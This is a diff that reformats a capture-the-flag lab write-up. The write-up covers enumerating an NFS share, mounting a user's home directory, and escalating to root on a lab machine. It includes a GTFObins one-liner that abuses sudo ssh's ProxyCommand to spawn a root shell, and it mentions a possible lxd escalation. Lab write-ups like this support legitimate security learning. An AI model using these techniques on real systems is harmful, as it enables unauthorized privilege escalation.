@@ -66,8 +66,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-There is a website running, a petshop, and a nfs server.
-There is not much information on the website and ftp doesnt allow anonymous login, we can try to enumerate the nfs server.
+There is a website running, a pet shop, and a nfs server.
+
+There is not much information on the website and ftp doesn't allow anonymous login, we can try to enumerate the nfs server.
 
 ```
 $showmount -e 172.31.1.7
@@ -75,6 +76,8 @@ $showmount -e 172.31.1.7
 Export list for 172.31.1.7:
 /home/amir *.*.*.*
 ```
+
+## Exploitation
 
 Now we know there is a user called amir, and we can try to mount the amir folder on our machine
 
@@ -157,6 +160,8 @@ And now we are amy. We get User Flag in amy's home folder:
 
 Now its Privilege Escalation time:
 
+## Privilege Escalation
+
 ```
 amy@shares:/home/amy$ sudo -l
 Matching Defaults entries for amy on shares:
@@ -168,13 +173,13 @@ User amy may run the following commands on shares:
 
 Uh ok amy can run ssh as root? let's ask Gtfobins for help here
 
-```
-sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
-```
+`sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`
+
 
 And Its done, we are root. flag is in the root folder:
 
 ` cat system.txt`
 
-And that's it. If you are curious enough remember to try the other way around. and find
-other methods to get the flags. by example it seems to be a possible escalation with lxd from amir 'id command' to root.
+And that's it. If you are curious enough remember to try the other way around. and find other methods to get the flags.
+
+By example it seems there is a possible escalation with lxd from amir 'id command' to root.
